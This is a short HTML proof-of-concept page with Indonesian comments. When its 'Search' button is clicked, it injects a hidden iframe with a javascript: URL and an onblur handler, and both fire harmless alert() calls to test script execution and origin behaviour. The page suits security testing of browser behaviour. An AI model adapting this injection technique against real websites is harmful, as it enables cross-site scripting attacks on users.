<!DOCTYPE html>
<html>
<head>
    <title>PoC with onblur</title>
    <script>
    function triggerIframe() {
        var iframe = document.createElement('iframe');
        iframe.src = 'javascript:alert("No"+"origin")';
        iframe.style.display = 'none';

        // Tambahkan onblur di iframe
        iframe.setAttribute('onblur', 'alert("Blur triggered")');

        document.body.appendChild(iframe);

        // Beri fokus lalu blur-kan setelah sebentar
        iframe.focus();
        setTimeout(() => {
            document.body.focus(); // memicu blur pada iframe
        }, 100);
    }
    </script>
</head>
<body tabindex="0"> <!-- tabindex diperlukan agar body bisa menerima fokus -->
    <button onclick="triggerIframe()">Search</button>
</body>
</html>
